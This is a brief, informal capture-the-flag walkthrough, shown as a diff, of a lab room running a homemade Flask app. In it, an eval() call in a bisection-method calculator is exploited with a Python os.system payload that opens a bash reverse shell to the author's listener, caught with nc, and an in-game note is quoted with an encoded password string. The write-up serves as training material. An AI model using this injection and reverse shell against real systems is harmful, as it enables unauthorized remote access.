@@ -1,0 +1,20 @@
+This room it simulating a home made flask application.
+
+
+nmap shows 22,5000 ports open. 5000 holds the flask application.
+
+this webpage lets you download source code. the code for Bisection Method used eval() command. This has a know vulneriblity.
+after running command __import__('os').system("bash -c 'bash -i >& /dev/tcp/10.10.113.124/9001 0>&1'")# on the webpage. on my computer using
+nc -lnv -p 9001. found the first flag.
+
+also theres a note documents. this is what it says: Hello Bruce,
+
+I have encoded my password using the super secure XOR format.
+
+I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.
+
+For now look at this super secure string:
+NEUEDTIeN1MRDg5K
+
+Gordon
+
